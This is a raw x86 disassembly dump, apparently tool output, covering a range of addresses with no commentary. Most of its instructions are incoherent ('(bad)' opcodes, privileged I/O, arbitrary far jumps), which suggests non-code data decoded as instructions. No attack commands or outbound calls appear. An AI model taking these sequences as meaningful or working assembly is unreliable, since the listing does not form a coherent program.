  41dba2:	cmp    DWORD PTR [edi+eax*8-0x55],ebp
  41dba6:	loop   0x41dbb5
  41dba8:	(bad)  
  41dba9:	out    dx,al
  41dbaa:	mov    edx,ds
  41dbac:	into   
  41dbad:	jmp    0x2e9b:0x625ce7cd
  41dbb4:	jnp    0x41dbb6
	...
  41dc16:	outs   dx,DWORD PTR ds:[esi]
  41dc17:	retf   0x9815
  41dc1a:	mov    ch,0xdf
  41dc1c:	out    dx,eax
  41dc1d:	dec    ebp
  41dc1f:	ja     0x41dc8f
  41dc21:	aas    
  41dc22:	jae    0x41dc46
  41dc24:	ja     0x41dc24
  41dc26:	int3   
  41dc27:	cmp    al,BYTE PTR [ecx]
  41dc29:	add    BYTE PTR [edi],al
  41dc2b:	add    DWORD PTR [eax],eax
  41dc2d:	add    BYTE PTR [eax-0x4d1c1f99],ah
  41dc33:	jmp    0xb5c121ea
  41dc38:	lods   al,BYTE PTR ds:[esi]
  41dc39:	ror    DWORD PTR [ecx+edx*2+0x51],cl
  41dc3d:	jl     0x41dc28
  41dc3f:	sti    
  41dc40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc41:	lahf   
  41dc42:	aaa    
  41dc43:	xchg   ebp,eax
  41dc44:	test   bh,dh
  41dc46:	in     eax,dx
  41dc47:	mov    cl,0x88
  41dc49:	sub    eax,0x428c1372
  41dc4e:	test   eax,0x31431f5b
  41dc53:	repnz addr16 pop edi
  41dc56:	ds repnz pushf 
  41dc59:	rol    BYTE PTR [ecx+0x35a07041],0x1
  41dc60:	xor    BYTE PTR [edx-0x11],dl
  41dc63:	xor    al,0x1e
  41dc65:	daa    
  41dc66:	inc    ebp
  41dc67:	mov    bh,al
  41dc69:	scas   al,BYTE PTR es:[edi]
  41dc6a:	(bad)  
  41dc6b:	adc    al,0x7d
  41dc6d:	enter  0x3208,0xa0
  41dc71:	xor    ecx,eax
  41dc73:	lock popa 
  41dc75:	sbb    al,0xc0
  41dc77:	jp     0x41dcf7
  41dc79:	push   0x6ccaaa19
  41dc7e:	cmp    al,0xc0
  41dc80:	into   
  41dc81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc82:	repz ja 0x41dc87
  41dc85:	cmp    ebx,edi
  41dc87:	psllw  mm7,mm0
  41dc8a:	test   eax,0xaffbab2d
  41dc8f:	jp     0x41dc97
  41dc91:	sbb    DWORD PTR [eax+ebx*8+0x6b],ebp
  41dc95:	loope  0x41dc4b
  41dc97:	hlt    
  41dc98:	jp     0x41dc23
  41dc9a:	loopne 0x41dcff
  41dc9c:	retf   
  41dc9d:	adc    esi,DWORD PTR [edi+0x3]
  41dca0:	ja     0x41dd00
  41dca2:	jbe    0x41dcd5
  41dca4:	add    BYTE PTR [esi+0x8],dh
  41dca7:	stc    
  41dca8:	retf   
  41dca9:	xchg   ecx,eax
  41dcaa:	mov    ebp,0xc08843c9
  41dcaf:	jne    0x41dd0a
  41dcb1:	(bad)  [eax+0x7c]
  41dcb4:	sub    dh,al
  41dcb6:	xor    esi,ebx
  41dcb8:	mov    ah,0x1d
  41dcba:	or     eax,esp
  41dcbc:	xor    BYTE PTR [esi+0x168202a6],dl
  41dcc2:	mov    bl,0xea
  41dcc4:	fnsave [edx+0x29]
  41dcc7:	aam    0xe2
  41dcc9:	push   es
  41dcca:	addr16 cmp al,0xe8
  41dccd:	mov    ch,0x7d
  41dccf:	into   
  41dcd0:	fs push ebx
  41dcd2:	jmp    0x41dcc6
  41dcd4:	js     0x41dc57
  41dcd6:	dec    edi
  41dcd7:	push   cs
  41dcd8:	push   edi
  41dcd9:	fisttp DWORD PTR [esi+0x69cd1a55]
  41dcdf:	lods   al,BYTE PTR ds:[esi]
  41dce0:	fwait
  41dce1:	aas    
  41dce2:	(bad)  
  41dce3:	out    dx,eax
  41dce4:	mov    BYTE PTR [edx+0x27],dl
  41dce7:	mov    ch,0xd6
  41dce9:	pushf  
  41dcea:	mov    ds:0x194cd3b7,eax
  41dcef:	inc    ebx
  41dcf0:	or     eax,0xf25ef89b
  41dcf5:	aaa    
  41dcf6:	shl    BYTE PTR [ebp+eiz*8-0x40],cl
  41dcfa:	jo     0x41dcb2
  41dcfc:	enter  0x8b18,0x90
  41dd00:	mov    cr3,ebx
  41dd03:	mov    ds,WORD PTR [ecx+0x747b9bbf]
  41dd09:	mov    ah,ah
  41dd0b:	rcl    edi,0xe0
  41dd0e:	sbb    BYTE PTR [eax+0x36],dh
  41dd11:	inc    edi
  41dd12:	shl    BYTE PTR [ecx+0x8],1
  41dd15:	sahf   
  41dd16:	int    0x77
  41dd18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd19:	pop    es
  41dd1a:	sub    esp,DWORD PTR [ebp+0x75]
  41dd1d:	dec    ecx
  41dd1e:	mov    al,ds:0x9e5ebed4
  41dd23:	or     BYTE PTR [eiz*4+0x5c870862],ah
  41dd2a:	inc    edx
  41dd2b:	or     al,0x86
  41dd2d:	in     eax,dx
  41dd2e:	xor    BYTE PTR es:[ebp-0x28],dh
  41dd32:	mov    ah,0x52
  41dd34:	dec    eax
	...
  41dd95:	add    BYTE PTR [eax],ah
  41dd97:	repz das 
  41dd99:	cmp    bh,0xde
  41dd9c:	lods   eax,DWORD PTR ds:[esi]
  41dd9d:	repz mov ds:0x391667bb,eax
  41dda3:	push   es
  41dda4:	inc    edi
  41dda5:	dec    ecx
  41dda6:	sar    DWORD PTR [ebx],cl
  41dda8:	add    DWORD PTR [eax],eax
  41ddaa:	pop    es
  41ddab:	add    DWORD PTR [eax],eax
  41ddad:	add    dh,dh
  41ddaf:	fdiv   st(2),st
  41ddb1:	jle    0x41de19
  41ddb3:	xchg   edx,eax
  41ddb4:	or     edi,DWORD PTR [esi-0x794039d3]
  41ddba:	out    0x9e,al
  41ddbc:	push   es
  41ddbd:	int    0x5a
  41ddbf:	sub    al,0x58
  41ddc1:	push   ds
  41ddc2:	hlt    
  41ddc3:	dec    esi
  41ddc4:	sar    dh,1
  41ddc6:	xor    DWORD PTR [eax],ebx
  41ddc8:	cs int3 
  41ddca:	rol    dl,cl
  41ddcc:	jecxz  0x41ddfa
  41ddce:	pop    ebp
  41ddcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ddd0:	aas    
  41ddd1:	fsubr  st,st(7)
  41ddd3:	xchg   BYTE PTR [eax+0x33],ch
  41ddd6:	xor    bh,cl
  41ddd8:	push   edx
  41ddd9:	jnp    0x41de0a
  41dddb:	(bad)  
  41dddc:	fsubr  DWORD PTR [esi]
  41ddde:	and    eax,0xce79acc4
  41dde3:	cmp    eax,0x9ab76b81
  41dde8:	xchg   cl,dh
  41ddea:	sub    eax,0xb869510e
  41ddef:	repz jbe 0x41dddd
  41ddf2:	push   ss
  41ddf3:	shr    DWORD PTR fs:[ebx+0x352b9d3e],cl
  41ddfa:	mov    esp,0x5387d51f
  41ddff:	sbb    esi,DWORD PTR [eax+ebp*1-0x67]
  41de03:	fcmovne st,st(6)
  41de05:	hlt    
  41de06:	adc    eax,0xe1087a2d
  41de0b:	or     eax,0x3ab67f00
  41de10:	in     al,0xbe
  41de12:	repnz cld 
  41de14:	fwait
  41de15:	xor    cl,BYTE PTR [edx+0x40]
  41de18:	mov    esi,0xef6e89f6
  41de1d:	mov    edx,0xedb97dfa
  41de22:	nop
  41de23:	lods   al,BYTE PTR ds:[esi]
  41de24:	mov    cl,0xa1
  41de26:	mov    ebx,0x45d92b57
  41de2b:	sub    BYTE PTR [ebp-0x6d],ch
  41de2e:	ret    
  41de2f:	popf   
  41de30:	and    ecx,DWORD PTR [edi]
  41de32:	push   ebp
  41de33:	lahf   
  41de34:	mov    ebp,0xf592ccab
  41de39:	xchg   edx,eax
  41de3a:	adc    ch,BYTE PTR [ecx]
  41de3c:	pop    edx
  41de3d:	scas   eax,DWORD PTR es:[edi]
  41de3e:	or     ch,BYTE PTR [ebp+0x59ff81bc]
  41de44:	push   es
  41de45:	jne    0x41de69
  41de47:	arpl   WORD PTR [ebx-0x634469c6],sp
  41de4d:	push   cs
  41de4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de4f:	pop    eax
  41de50:	pop    ebx
  41de51:	dec    esi
  41de52:	and    al,0x5e
  41de54:	xchg   edi,eax
  41de55:	inc    edi
  41de56:	fwait
  41de57:	xchg   edx,eax
  41de58:	adc    DWORD PTR [edx-0x6b],edi
  41de5b:	pop    ss
  41de5c:	sbb    eax,0x55291c9e
  41de61:	out    dx,eax
  41de62:	pop    ecx
  41de63:	push   eax
  41de64:	into   
  41de65:	out    dx,eax
  41de66:	je     0x41de04
  41de68:	pop    ecx
  41de69:	mov    bh,ch
  41de6b:	mov    edx,0x938f4ee5
  41de70:	add    al,0x8e
  41de72:	inc    ebp
  41de73:	mov    esi,DWORD PTR ds:0xfc3894e1
  41de79:	push   esp
  41de7a:	jle    0x41de72
  41de7c:	pop    edi
  41de7d:	mov    edi,DWORD PTR [ecx-0x4]
  41de80:	jne    0x41de47
  41de82:	(bad)
  41de86:	xor    bh,BYTE PTR [ebx-0x577f17ae]
  41de8c:	jp     0x41de16
  41de8e:	and    ch,BYTE PTR [esi+0x44]
  41de91:	xchg   edi,eax
  41de92:	mov    ds:0x67fd01fe,eax
  41de97:	dec    edx
  41de98:	add    DWORD PTR [edi+0x1ac063f3],edi
  41de9e:	cmp    dl,BYTE PTR [eax]
  41dea0:	loopne 0x41dea2
  41dea2:	inc    ebp
  41dea3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dea4:	repnz into 
  41dea6:	and    bh,BYTE PTR [ebp+0x2a]
  41dea9:	jp     0x41deb7
  41deab:	imul   edi,edx,0xf0cd3151
  41deb1:	pop    ss
  41deb2:	push   edx
  41deb3:	cmp    al,BYTE PTR [edx+0x0]
	...
  41df15:	add    BYTE PTR [edi],bh
  41df17:	daa    
  41df18:	push   ss
  41df19:	cld    
  41df1a:	push   ds
  41df1b:	std    
  41df1c:	jmp    edi
  41df1e:	pop    es
  41df1f:	adc    eax,0xa7cc191
  41df24:	out    0xed,eax
  41df26:	fidivr DWORD PTR [ecx+eax*1]
  41df29:	add    BYTE PTR [edi],al
  41df2b:	add    DWORD PTR [eax],eax
  41df2d:	add    al,bl
  41df2f:	inc    ebp
  41df30:	push   ebp
  41df31:	push   0x9558aa73
  41df36:	sbb    DWORD PTR [ecx+0x2d957012],edi
  41df3c:	sub    DWORD PTR [eax+0x571f8a39],esp
  41df42:	push   edx
  41df43:	push   ds
  41df44:	or     ecx,edi
  41df46:	dec    ebp
  41df47:	mov    ah,0x74
  41df49:	stc    
  41df4a:	and    DWORD PTR [ebx+0x2e],eax
  41df4d:	div    edx
  41df4f:	mov    ebx,0xd611330
  41df54:	jmp    0x41df41
  41df56:	out    0x40,eax
  41df58:	aad    0x25
  41df5a:	mov    eax,0x3678573f
  41df5f:	retf   
  41df60:	and    eax,0x5118a747
  41df65:	mov    ebp,0x672c0a8e
  41df6a:	add    eax,0x4a516379
  41df6f:	or     ebx,DWORD PTR [edi]
  41df71:	out    dx,al
  41df72:	stc    
  41df73:	mov    ds:0x72ddbc23,eax
  41df78:	shl    DWORD PTR [esi-0x7dadeb16],0xef
  41df7f:	and    BYTE PTR [edi+0x59f958b8],bl
  41df85:	ret    0xf4dc
  41df88:	(bad)  
  41df89:	loope  0x41dfed
  41df8b:	xor    cl,BYTE PTR [eax]
  41df8d:	xchg   BYTE PTR [ebx+0x303ff513],ah
  41df93:	stos   BYTE PTR es:[edi],al
  41df94:	dec    esi
  41df95:	mov    ?,WORD PTR [ecx+0x39a78588]
  41df9b:	cmp    al,0x80
  41df9d:	cdq    
  41df9e:	test   eax,0xf8edf978
  41dfa3:	xchg   edi,eax
  41dfa4:	loop   0x41df37
  41dfa6:	xchg   esi,esi
  41dfa8:	out    0x69,al
  41dfaa:	daa    
  41dfab:	loope  0x41df78
  41dfad:	cmp    BYTE PTR [edi-0x79360b44],ah
  41dfb3:	ss scas eax,DWORD PTR es:[edi]
  41dfb5:	(bad)
  41dfba:	and    dl,ch
  41dfbc:	jno    0x41dff3
  41dfbe:	add    eax,0x38e4adf0
  41dfc3:	in     al,dx
  41dfc4:	and    dh,BYTE PTR [edx+ebp*2]
  41dfc7:	pop    eax
  41dfc8:	cmp    al,0x9f
  41dfca:	mov    ch,al
  41dfcc:	shl    DWORD PTR [eax],cl
  41dfce:	scas   eax,DWORD PTR es:[edi]
  41dfcf:	xchg   ebx,eax
  41dfd0:	sbb    eax,0x1d3b5d91
  41dfd5:	add    eax,0x19292d6d
  41dfda:	mov    WORD PTR [edi],?
  41dfdc:	daa    
  41dfdd:	jmp    0x41df92
  41dfdf:	push   ds
  41dfe0:	pop    edx
  41dfe1:	xchg   ebp,eax
  41dfe2:	or     DWORD PTR ds:0x15e21f77,0x9b1b84d1
  41dfec:	sub    BYTE PTR [ebp+0x7ea9a1a3],cl
  41dff2:	sbb    al,0x29
  41dff4:	sub    eax,0x4093655e
  41dff9:	jg     0x41e01b
  41dffb:	inc    ecx
  41dffc:	in     al,0xf8
  41dffe:	in     eax,dx
  41dfff:	fist   DWORD PTR [ebp-0x7c97fdea]
  41e005:	sub    dh,BYTE PTR [edi]
  41e007:	mov    cl,0xc
  41e009:	in     al,dx
  41e00a:	test   eax,0x1d221f79
  41e00f:	test   DWORD PTR [eax-0x65],esi
  41e012:	push   ebx
  41e013:	push   edi
  41e014:	adc    ecx,ebx
  41e016:	sti    
  41e017:	out    dx,eax
  41e018:	mov    eax,ds:0x96021363
  41e01d:	sahf   
  41e01e:	or     ecx,ecx
  41e020:	test   eax,0xf41aa2b7
  41e025:	std    
  41e026:	and    eax,ecx
  41e028:	push   ebx
  41e029:	test   eax,0xf44b6aa6
  41e02e:	xchg   edi,eax
  41e02f:	(bad)  
  41e030:	out    0x43,eax
  41e032:	dec    ecx
  41e033:	stc    
  41e034:	and    al,BYTE PTR [eax]
	...
  41e096:	dec    edi
  41e097:	push   ebx
  41e098:	add    al,0xc
  41e09a:	sbb    al,0x5f
  41e09c:	dec    edi
  41e09d:	push   ebx
  41e09e:	out    0x48,eax
  41e0a0:	jge    0x41e0ce
  41e0a2:	push   es
  41e0a3:	pop    edx
  41e0a4:	into   
  41e0a5:	xor    eax,0x13de1
  41e0aa:	pop    es
  41e0ab:	add    DWORD PTR [eax],eax
  41e0ad:	add    BYTE PTR [eax+esi*1+0x8],dh
  41e0b1:	cdq    
  41e0b2:	xor    esp,DWORD PTR [eax-0xa566816]
  41e0b8:	es mov ch,0x9a
  41e0bb:	adc    eax,0xed74eeb8
  41e0c0:	test   al,0xad
  41e0c2:	clc    
  41e0c3:	mov    bh,0x81
  41e0c5:	aas    
  41e0c6:	ret    
  41e0c7:	fwait
  41e0c8:	repnz (bad) 
  41e0ca:	shr    BYTE PTR [ecx+eiz*8],0x6d
  41e0ce:	push   esi
  41e0cf:	sub    al,BYTE PTR [ecx+0x36]
  41e0d2:	bound  edx,QWORD PTR [edi]
  41e0d4:	mov    ah,0x3b
  41e0d6:	fst    DWORD PTR [edi]
  41e0d8:	push   es
  41e0d9:	nop
  41e0da:	scas   al,BYTE PTR es:[edi]
  41e0db:	sub    BYTE PTR [esi],ch
  41e0dd:	mov    al,ds:0xd8684d41
  41e0e2:	add    dl,BYTE PTR [ecx+ebx*1+0x12cee3e8]
  41e0e9:	and    eax,0xfc8c7b3e
  41e0ee:	mov    gs,WORD PTR [eax-0x6c87809f]
  41e0f4:	cs push eax
  41e0f6:	xor    ebx,edx
  41e0f8:	imul   edi,DWORD PTR [esi-0x226751b0],0xffffffd4
  41e0ff:	int    0xb
  41e101:	(bad)  
  41e102:	ja     0x41e17f
  41e104:	clc    
  41e105:	sub    eax,0xf66ad152
  41e10a:	iret   
  41e10b:	push   cs
  41e10c:	pop    DWORD PTR [ebx+esi*1-0x6bdad43a]
  41e113:	imul   ecx
  41e115:	arpl   WORD PTR [ebx],bp
  41e117:	add    BYTE PTR [ecx-0x714b1978],cl
  41e11d:	es jmp 0xf6663bb5
  41e123:	loop   0x41e0ca
  41e125:	xchg   ecx,eax
  41e126:	inc    edi
  41e127:	inc    edx
  41e128:	sub    eax,0xbe24d2f1
  41e12d:	mov    eax,0x21d0d561
  41e132:	lods   eax,DWORD PTR ds:[esi]
  41e133:	ss inc ebx
  41e135:	xchg   edi,eax
  41e136:	call   FWORD PTR [edx-0x655657b5]
  41e13c:	jmp    0xdc9b:0x60933111
  41e143:	jne    0x41e112
  41e145:	pop    ecx
  41e146:	sub    ebp,eax
  41e148:	jb     0x41e15c
  41e14a:	or     DWORD PTR [edx-0x1c],edx
  41e14d:	inc    ecx
  41e14e:	call   0x1676a711
  41e153:	call   0xc2ba:0xaff70487
  41e15a:	outs   dx,BYTE PTR ds:[esi]
  41e15b:	add    cl,BYTE PTR [ecx-0x250bf94e]
  41e161:	enter  0x367f,0x99
  41e165:	jbe    0x41e107
  41e167:	nop
  41e168:	jno    0x41e160
  41e16a:	mov    fs,WORD PTR [ecx-0x5b862af2]
  41e170:	pop    es
  41e171:	dec    esp
  41e172:	push   edi
  41e173:	fild   QWORD PTR [edi+ebx*8-0x71]
  41e177:	adc    edi,DWORD PTR [edi-0xcd9d6ea]
  41e17d:	dec    ebp
  41e17e:	jle    0x41e1de
  41e180:	jns    0x41e119
  41e182:	jns    0x41e19e
  41e184:	cmp    DWORD PTR [edx+0x61],0xd07bcbab
  41e18b:	inc    ebp
  41e18c:	sti    
  41e18d:	or     eax,0xcec44e43
  41e192:	xchg   esp,eax
  41e193:	(bad)  
  41e194:	lods   eax,DWORD PTR ds:[esi]
  41e195:	mov    dl,0x2a
  41e197:	out    dx,eax
  41e198:	mov    edx,DWORD PTR [ebp-0x15]
  41e19b:	mov    dl,0xee
  41e19d:	sbb    BYTE PTR [eax+0x78bfa530],dh
  41e1a3:	fnsave [eax]
  41e1a5:	cmp    eax,0x734bc6d9
  41e1aa:	mov    ch,0xab
  41e1ac:	lock sub eax,0xc5cc1435
  41e1b2:	ds or  dl,ch
	...
  41e215:	add    BYTE PTR [ebx-0x1988fe],ch
  41e21b:	idiv   DWORD PTR [ebx-0xf75b5b1]
  41e221:	mov    esp,eax
  41e223:	mov    ebx,0x3ee86a3d
  41e228:	add    DWORD PTR [eax],eax
  41e22a:	pop    es
  41e22b:	add    DWORD PTR [eax],eax
  41e22d:	add    BYTE PTR [edx+0x73],ch
  41e230:	cmp    al,0x3c
  41e232:	loope  0x41e1f1
  41e234:	int    0x96
  41e236:	inc    ebx
  41e237:	mov    cl,0xa8
  41e239:	pop    ebx
  41e23a:	xchg   edi,eax
  41e23b:	data16 sbb bl,bh
  41e23e:	call   0x9797e8dd
  41e243:	int3   
  41e244:	add    al,0x26
  41e246:	into   
  41e247:	push   edi
  41e248:	lahf   
  41e249:	scas   al,BYTE PTR es:[edi]
  41e24a:	push   esi
  41e24b:	pop    edi
  41e24c:	cmp    dl,BYTE PTR [ebx-0x37]
  41e24f:	mov    cl,0x78
  41e251:	push   ebx
  41e252:	repnz in eax,dx
  41e254:	pusha  
  41e255:	pushf  
  41e256:	inc    BYTE PTR [edx+edx*1-0xb553aa2]
  41e25d:	push   ss
  41e25e:	pop    es
  41e25f:	jno    0x41e277
  41e261:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e262:	push   ss
  41e263:	and    BYTE PTR [esp+esi*1-0x77],dl
  41e267:	inc    DWORD PTR [edx]
  41e269:	rcr    BYTE PTR [ecx+eax*4+0x5bfe64b6],0x5d
  41e271:	hlt    
  41e272:	bound  ebx,QWORD PTR [edi+eiz*1]
  41e275:	inc    esi
  41e276:	or     esp,edi
  41e278:	lods   al,BYTE PTR fs:[esi]
  41e27a:	retf   0xd18b
  41e27d:	arpl   WORD PTR [ebx],di
  41e27f:	adc    BYTE PTR [esi-0x7e],cl
  41e282:	jmp    0x41e2c3
  41e284:	sub    DWORD PTR gs:[edx-0x177ff189],ebx
  41e28b:	adc    edx,ecx
  41e28d:	jnp    0x41e278
  41e28f:	push   ss
  41e290:	stos   DWORD PTR es:[edi],eax
  41e291:	repnz (bad) 
  41e293:	jmp    0xd0b6abdd
  41e298:	aaa    
  41e299:	xor    cl,dh
  41e29b:	test   al,0x9e
  41e29d:	push   ebp
  41e29e:	pop    ecx
  41e29f:	sub    edi,eax
  41e2a1:	mov    ah,0xd5
  41e2a3:	push   ds
  41e2a4:	fild   WORD PTR [eax]
  41e2a6:	std    
  41e2a7:	stc    
  41e2a8:	rcr    DWORD PTR [eax+0x776d6469],0xf7
  41e2af:	cld    
  41e2b0:	sub    ch,ch
  41e2b2:	jb     0x41e2e1
  41e2b4:	pop    edx
  41e2b5:	ror    DWORD PTR [esp+ecx*1-0x38],cl
  41e2b9:	enter  0x3bda,0x44
  41e2bd:	arpl   WORD PTR [eax-0x509254a5],ax
  41e2c3:	pop    es
  41e2c4:	inc    BYTE PTR [edi-0x17d9facc]
  41e2ca:	outs   dx,BYTE PTR ds:[esi]
  41e2cb:	and    eax,0x8aa46394
  41e2d0:	fcmovu st,st(7)
  41e2d2:	cmp    esp,DWORD PTR [ecx]
  41e2d4:	mov    bh,0x4a
  41e2d6:	hlt    
  41e2d7:	jns    0x41e282
  41e2d9:	ins    DWORD PTR es:[edi],dx
  41e2da:	cmp    BYTE PTR [esi+0xdf52fac],dh
  41e2e0:	frstor [eax]
  41e2e2:	xchg   BYTE PTR [ebp+0x1c8e4efe],cl
  41e2e8:	or     dl,BYTE PTR [esi-0x1dad8fcd]
  41e2ee:	int3   
  41e2ef:	mov    ecx,0x37e390cc
  41e2f4:	cmp    ebp,DWORD PTR ds:0xb70b1e2c
  41e2fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2fb:	or     dh,bl
  41e2fd:	sbb    bl,BYTE PTR [edx]
  41e2ff:	aad    0x46
  41e301:	repnz cmp eax,0x4ad99745
  41e307:	and    ah,BYTE PTR [eax+ecx*2-0x1d]
  41e30b:	jne    0x41e2f9
  41e30d:	outs   dx,DWORD PTR ds:[esi]
  41e30e:	rcl    DWORD PTR [esi+0x2a],0x18
  41e312:	mov    al,ds:0xec918786
  41e317:	popf   
  41e318:	icebp  
  41e319:	out    0xca,eax
  41e31b:	jmp    0x8ab3:0x11e4dcc8
  41e322:	(bad)  
  41e323:	mov    ds:0x3ce94170,eax
  41e328:	mov    edi,0x1ecd16de
  41e32d:	dec    esp
  41e32e:	loopne 0x41e393
  41e330:	(bad)  [ecx]
  41e332:	dec    eax
  41e333:	ret    
  41e334:	adc    eax,DWORD PTR [eax]
	...
  41e396:	mov    DWORD PTR [edx],edx
  41e398:	ja     0x41e3b9
  41e39a:	(bad)  
  41e39b:	jg     0x41e386
  41e39d:	xchg   esi,eax
  41e39e:	cmp    eax,0xd0204855
  41e3a3:	pop    ss
  41e3a4:	push   0x3f
  41e3a6:	out    dx,eax
  41e3a7:	aas    
  41e3a8:	add    DWORD PTR [eax],eax
  41e3aa:	pop    es
  41e3ab:	add    DWORD PTR [eax],eax
  41e3ad:	add    BYTE PTR [eax+ebp*1+0x49c68d9c],al
  41e3b4:	adc    dh,BYTE PTR [edi]
  41e3b6:	mov    gs,WORD PTR [eax+0x1499beba]
  41e3bc:	ds dec edi
  41e3be:	xchg   ebp,eax
  41e3bf:	mov    dh,0xd3
  41e3c1:	loope  0x41e3bb
  41e3c3:	xchg   BYTE PTR [edi+esi*2-0x47ae06d5],al
  41e3ca:	xchg   edx,eax
  41e3cb:	push   ebp
  41e3cc:	mov    ebp,DWORD PTR [eax+0x278a3315]
  41e3d2:	sbb    dh,ch
  41e3d4:	loop   0x41e42a
  41e3d6:	push   ebp
  41e3d7:	add    DWORD PTR [ebp+edx*2+0x12fb7d6f],ecx
  41e3de:	mov    ch,0xbd
  41e3e0:	push   ecx
  41e3e1:	mov    ebx,DWORD PTR [eax+0x5f]
  41e3e4:	adc    eax,0x18437eb8
  41e3e9:	fiadd  DWORD PTR [ebx-0x64f80279]
  41e3ef:	add    bh,dl
  41e3f1:	cmp    eax,0x51b3cc7
  41e3f6:	xchg   esp,eax
  41e3f7:	mov    eax,0x357f33a7
  41e3fc:	jecxz  0x41e3e9
  41e3fe:	mov    dh,0xa8
  41e400:	push   ds
  41e401:	out    dx,al
  41e402:	test   DWORD PTR [bx+di],0x8705ba4f
  41e409:	(bad)  
  41e40a:	cmp    ecx,eax
  41e40c:	adc    edi,DWORD PTR [edi-0x57d2f530]
  41e412:	jns    0x41e484
  41e414:	int3   
  41e415:	(bad)  
  41e416:	clc    
  41e417:	cld    
  41e418:	test   eax,0xf7d27bd7
  41e41d:	add    BYTE PTR [ebp+eax*1-0x6ecbd57f],dh
  41e424:	pusha  
  41e425:	enter  0x5c05,0xce
  41e429:	hlt    
  41e42a:	and    al,0x7c
  41e42c:	jmp    0x85b9:0x54c3c26f
  41e433:	(bad)  
  41e434:	aam    0x7b
  41e436:	lods   eax,DWORD PTR ds:[esi]
  41e437:	add    ch,dh
  41e439:	mov    DWORD PTR [eax],edx
  41e43b:	sbb    dh,BYTE PTR [ecx-0x58]
  41e43e:	jns    0x41e48b
  41e440:	adc    al,0xe5
  41e442:	sbb    DWORD PTR [ebx],0x23
  41e445:	cwde   
  41e446:	sahf   
  41e447:	out    dx,al
  41e448:	xchg   ebp,eax
  41e449:	pop    ds
  41e44a:	push   edx
  41e44b:	scas   eax,DWORD PTR es:[edi]
  41e44c:	rcr    DWORD PTR [esi-0x8c07b72],1
  41e452:	mov    ebx,0x4b800abf
  41e457:	repnz (bad) 
  41e459:	mov    ds:0x9254939b,eax
  41e45e:	dec    edi
  41e45f:	sbb    DWORD PTR [ebx+0x2c3dff00],ebp
  41e465:	lea    ecx,[ecx+0xa]
  41e468:	mov    ebx,DWORD PTR [eax-0x49]
  41e46b:	xor    ebp,DWORD PTR [eax]
  41e46d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e46e:	call   0xa88a029a
  41e473:	aaa    
  41e474:	test   ecx,ecx
  41e476:	mov    ds:0x5bdd12c3,al
  41e47b:	adc    dh,BYTE PTR [ebx-0x5b]
  41e47e:	jb     0x41e4b6
  41e480:	jne    0x41e49a
  41e482:	xchg   edx,eax
  41e483:	cdq    
  41e484:	xchg   ebx,eax
  41e485:	das    
  41e486:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e487:	fwait
  41e488:	pop    ds
  41e489:	adc    eax,eax
  41e48b:	sub    eax,0x52a91bcd
  41e491:	(bad)  
  41e492:	clc    
  41e493:	push   ebp
  41e494:	int    0x9a
  41e496:	rol    DWORD PTR [eax-0x19],1
  41e499:	lds    ebp,FWORD PTR [ebp+0x351275c3]
  41e49f:	(bad)  
  41e4a0:	xor    ebp,DWORD PTR [ecx]
  41e4a2:	inc    ecx
  41e4a3:	leave  
  41e4a4:	ds inc edx
  41e4a6:	add    bl,bh
  41e4a8:	shr    DWORD PTR gs:[ecx+0x26],0x8d
  41e4ad:	cwde   
  41e4ae:	je     0x41e462
  41e4b0:	ror    BYTE PTR [edi+ebx*1],1
  41e4b3:	push   ebx
  41e4b4:	rol    BYTE PTR [eax],cl
	...
  41e516:	and    BYTE PTR [edx-0x35],ch
  41e519:	dec    ebx
  41e51a:	retf   
  41e51b:	jmp    0x41e4bd
  41e51d:	imul   ecx,DWORD PTR [edi+0x51],0xffffff9a
  41e521:	push   ss
  41e522:	retf   
  41e523:	mov    edx,0x40f6474f
  41e528:	add    DWORD PTR [eax],eax
  41e52a:	pop    es
  41e52b:	add    DWORD PTR [eax],eax
  41e52d:	add    BYTE PTR [edx],cl
  41e52f:	mov    ah,0xb2
  41e531:	in     eax,0xde
  41e533:	mov    DWORD PTR ds:0xd79e7cd3,0x93aa9939
  41e53d:	mov    bh,0xae
  41e53f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e540:	sub    BYTE PTR [eax-0x66],bh
  41e543:	loope  0x41e58d
  41e545:	mov    ds:0xb762f750,eax
  41e54a:	xchg   edi,eax
  41e54b:	enter  0x2cf1,0xbb
  41e54f:	fdivp  st(4),st
  41e551:	jns    0x41e527
  41e553:	test   al,0xad
  41e555:	test   DWORD PTR [ebx],esi
  41e557:	cmp    BYTE PTR [ebx-0x3c3c52f5],bl
  41e55d:	out    0x13,eax
  41e55f:	pop    esp
  41e560:	sub    ch,BYTE PTR [esi-0x485eb9a4]
  41e566:	loopne 0x41e5af
  41e568:	scas   al,BYTE PTR es:[edi]
  41e569:	push   eax
  41e56a:	sub    DWORD PTR [ebx-0x46],esp
  41e56d:	add    ecx,ebx
  41e56f:	mov    ecx,0xcd8f85bd
  41e574:	mov    ds:0x20f42960,eax
  41e579:	hlt    
  41e57a:	and    esi,edx
  41e57c:	and    cl,cl
  41e57e:	jg     0x41e5c6
  41e580:	test   DWORD PTR [edx+0x2220e078],ebp
  41e586:	xor    ebx,DWORD PTR [ebx]
  41e588:	sub    eax,0xa12a897b
  41e58d:	or     al,0xc8
  41e58f:	xchg   ebx,eax
  41e590:	cwde   
  41e591:	retf   
  41e592:	mov    edx,0x125e326
  41e597:	jg     0x41e59f
  41e599:	or     BYTE PTR [ecx-0x36],0x6e
  41e59d:	add    eax,DWORD PTR [edi]
  41e59f:	dec    ecx
  41e5a0:	jle    0x41e5f4
  41e5a2:	sbb    ah,BYTE PTR [ecx-0x742328e0]
  41e5a8:	(bad)  
  41e5a9:	in     al,0x50
  41e5ab:	inc    edi
  41e5ac:	push   edi
  41e5ad:	xchg   BYTE PTR [esi-0x15a7db0b],dl
  41e5b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5b4:	xlat   BYTE PTR ds:[ebx]
